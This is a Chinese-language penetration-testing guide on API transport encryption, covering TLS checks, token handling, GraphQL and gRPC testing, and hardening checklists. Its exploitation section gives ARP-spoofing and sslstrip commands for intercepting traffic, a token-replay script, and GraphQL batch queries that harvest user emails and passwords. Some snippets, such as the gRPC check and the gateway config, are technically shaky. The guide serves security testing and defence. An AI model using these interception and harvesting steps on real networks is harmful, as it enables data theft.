# API 传输加密测试

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供 API 传输加密测试的方法论。通过本指南，测试人员可以评估 RESTful API、GraphQL、gRPC 等接口的传输加密实现，发现 TLS 配置、认证令牌、数据加密等方面的安全缺陷。

### 1.2 适用范围
本文档适用于以下场景：
- RESTful API 加密测试
- GraphQL API 安全评估
- gRPC 服务加密检测
- WebSocket 加密通信
- 微服务间通信加密

### 1.3 读者对象
- API 安全测试人员
- 渗透测试工程师
- 微服务安全审计人员
- 后端安全开发人员

---

## 第二部分：核心渗透技术专题

### 专题一：API 传输加密测试

#### 2.1 技术介绍

**API 传输加密测试**是对 API 通信过程中的加密保护进行全面评估，包括传输层加密（TLS）、应用层加密、认证令牌保护等方面。

**API 加密测试维度：**

| 维度 | 检测内容 | 风险等级 |
|------|---------|---------|
| 传输层加密 | TLS 版本、加密套件、证书 | 高危 |
| 认证令牌 | JWT、OAuth Token 保护 | 严重 |
| 敏感数据 | 请求/响应体加密 | 高危 |
| 端点安全 | HTTPS 强制、HSTS | 中 - 高危 |
| 消息完整性 | 签名、防篡改 | 中危 |

#### 2.2 测试常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 开放 API | 第三方集成接口 | 认证令牌泄露导致未授权访问 |
| 移动后端 | App API 接口 | 中间人攻击窃取数据 |
| 微服务架构 | 服务间通信 | 内部 API 未加密 |
| 单页应用 | SPA 前端 API | Token 存储和传输不当 |
| 物联网 | IoT 设备 API | 设备认证弱加密 |
| 金融 API | 支付、交易接口 | 敏感金融数据泄露 |

#### 2.3 漏洞检测方法

##### 2.3.1 TLS 配置检测

```bash
# 检测 API 端点 TLS 配置
testssl.sh api.target.com:443

# 使用 Nmap 枚举加密套件
nmap --script ssl-enum-ciphers -p 443 api.target.com

# 检测是否强制 HTTPS
curl -I http://api.target.com/health
# 应返回 301/302 重定向到 HTTPS

# 检测 HSTS 配置
curl -I https://api.target.com/health
# 应包含 Strict-Transport-Security 头
```

##### 2.3.2 敏感数据泄露检测

```bash
# 检测 API 响应中的敏感数据
curl -X GET https://api.target.com/users/me \
  -H "Authorization: Bearer $TOKEN" | jq

# 查找明文密码、密钥等
curl -X GET https://api.target.com/config | grep -iE "password|secret|key"

# 检测 GraphQL 内省查询（可能泄露 schema）
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

##### 2.3.3 认证令牌检测

```bash
# 检查 Token 传输方式
# Token 不应在 URL 中传输
curl -X GET "https://api.target.com/users?token=xxx"

# 检查 Token 是否使用 HTTPS Cookie
# 应设置 Secure 和 HttpOnly 标志
curl -I https://api.target.com/login

# 检查 JWT 算法
# 解码 JWT 检查算法类型
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
```

##### 2.3.4 使用 Burp Suite 检测

```
1. 配置 Burp Suite 代理
2. 拦截 API 请求/响应
3. 检查以下项目：
   - 请求是否使用 HTTPS
   - 敏感数据是否明文传输
   - Token 是否在 Cookie 中安全传输
   - 响应头安全配置
   - 证书有效性
```

#### 2.4 漏洞利用方法

##### 2.4.1 中间人攻击

```bash
# 使用 SSLstrip 降级攻击
sslstrip -l 8080 -w output.log

# 配置 ARP 欺骗
arpspoof -i eth0 -t victim gateway

# 重定向流量
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# 如果目标未强制 HTTPS，可窃取明文数据
```

##### 2.4.2 Token 劫持

```python
#!/usr/bin/env python3
"""
API Token 劫持测试
"""
import requests

def test_token_security(base_url, token):
    """测试 Token 安全性"""
    
    headers = {"Authorization": f"Bearer {token}"}
    
    # 测试 1: Token 是否绑定 IP
    resp = requests.get(f"{base_url}/users/me", headers=headers)
    print(f"原始请求：{resp.status_code}")
    
    # 测试 2: Token 是否可重放（应实现 Token 过期/一次性）
    for i in range(10):
        resp = requests.get(f"{base_url}/users/me", headers=headers)
        if resp.status_code == 200:
            print(f"重放 {i+1}: 成功")
    
    # 测试 3: Token 是否绑定设备指纹
    # 修改 User-Agent
    headers["User-Agent"] = "Malicious Agent"
    resp = requests.get(f"{base_url}/users/me", headers=headers)
    print(f"修改 UA 后：{resp.status_code}")
    
    # 测试 4: HTTP vs HTTPS
    try:
        http_url = base_url.replace("https://", "http://")
        resp = requests.get(f"{http_url}/users/me", headers=headers, allow_redirects=False)
        if resp.status_code == 200:
            print("[!] Token 可通过 HTTP 传输！")
    except:
        pass
```

##### 2.4.3 GraphQL 攻击

```python
#!/usr/bin/env python3
"""
GraphQL API 攻击测试
"""
import requests

def graphql_introspection_attack(graphql_endpoint):
    """GraphQL 内省查询攻击"""
    
    # 获取完整 Schema
    introspection_query = """
    {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          kind
          name
          description
          fields {
            name
            description
            type {
              name
              kind
              ofType { name }
            }
          }
        }
      }
    }
    """
    
    resp = requests.post(
        graphql_endpoint,
        json={"query": introspection_query}
    )
    
    if resp.status_code == 200:
        schema = resp.json()
        print("[+] GraphQL Schema 泄露")
        return schema
    
    print("[-] 内省查询被禁用")
    return None

def graphql_batch_attack(graphql_endpoint, auth_headers):
    """GraphQL 批量查询攻击（绕过速率限制）"""
    
    # 在一个请求中执行多个查询
    batch_queries = []
    for i in range(100):
        batch_queries.append({
            "query": f"{{ user(id: {i}) {{ id email password }} }}"
        })
    
    resp = requests.post(
        graphql_endpoint,
        json=batch_queries,
        headers=auth_headers
    )
    
    return resp.json()
```

##### 2.4.4 gRPC 加密检测

```python
#!/usr/bin/env python3
"""
gRPC 服务加密检测
"""
import grpc

def test_grpc_encryption(channel_target):
    """测试 gRPC 通道加密"""
    
    # 尝试不加密连接
    try:
        insecure_channel = grpc.insecure_channel(channel_target)
        # 如果连接成功，说明未强制加密
        print(f"[!] {channel_target} 允许不加密连接")
    except Exception as e:
        print(f"[-] 需要加密连接：{e}")
    
    # 测试 TLS 连接
    try:
        with open('ca.crt', 'rb') as f:
            creds = grpc.ssl_channel_credentials(f.read())
        secure_channel = grpc.secure_channel(channel_target, creds)
        print("[+] TLS 连接成功")
    except Exception as e:
        print(f"[-] TLS 连接失败：{e}")
```

#### 2.5 安全配置建议

##### 2.5.1 API 传输加密最佳实践

```yaml
# API Gateway 配置示例（Kong）
plugins:
  - name: rate-limiting
    config:
      minute: 100
  - name: cors
    config:
      origins:
        - https://trusted-domain.com
  - name: response-ratelimiting
    config:
      limits:
        email: 10  # 限制敏感字段

# 强制 HTTPS
http:
  servers:
    - host: 0.0.0.0
      port: 80
      redirect: https://$host$request_uri
    
    - host: 0.0.0.0
      port: 443
      ssl:
        certificate: /path/to/cert.pem
        key: /path/to/key.pem
        protocols: TLSv1.2 TLSv1.3
        ciphers: HIGH:!aNULL:!MD5
```

##### 2.5.2 安全响应头配置

```
# 必须的安全响应头
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
```

##### 2.5.3 API 加密检查清单

**传输层:**
- [ ] 强制 HTTPS（301 重定向）
- [ ] TLS 1.2+ 仅启用
- [ ] 强加密套件配置
- [ ] HSTS 启用
- [ ] 证书有效且由可信 CA 签发

**认证层:**
- [ ] Token 仅通过 HTTPS 传输
- [ ] Token 不在 URL 中传输
- [ ] Token 实现过期机制
- [ ] Token 绑定设备/IP（可选）
- [ ] 刷新令牌安全存储

**应用层:**
- [ ] 敏感数据加密（如需要）
- [ ] 响应数据脱敏
- [ ] 请求/响应签名（高安全场景）
- [ ] 防重放攻击机制
- [ ] 速率限制

---

## 第三部分：附录

### 3.1 API 加密测试工具

| 工具 | 用途 |
|-----|------|
| Burp Suite | API 流量拦截和分析 |
| OWASP ZAP | API 安全扫描 |
| Postman | API 测试 |
| testssl.sh | TLS 配置检测 |
| GraphQL Inspector | GraphQL 安全检测 |
| grpcurl | gRPC 测试 |

### 3.2 API 安全风险

| 风险 | 影响 | 缓解措施 |
|-----|------|---------|
| 未加密传输 | 数据泄露 | 强制 HTTPS |
| 弱 TLS 配置 | 中间人攻击 | TLS 1.2+ |
| Token 泄露 | 未授权访问 | Token 加密存储和传输 |
| 敏感数据明文 | 隐私泄露 | 应用层加密 |
| 证书验证缺失 | 中间人攻击 | 证书固定 |

### 3.3 合规性要求

| 标准 | API 加密要求 |
|------|-------------|
| OWASP API Security | 传输加密、认证保护 |
| PCI DSS | 支付数据加密传输 |
| GDPR | 个人数据保护 |
| HIPAA | 医疗数据加密 |

---

## 参考资源

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [RFC 7235 - HTTP Authentication](https://tools.ietf.org/html/rfc7235)
- [RFC 6750 - OAuth 2.0 Bearer Token](https://tools.ietf.org/html/rfc6750)
- [GraphQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Security_Cheat_Sheet.html)
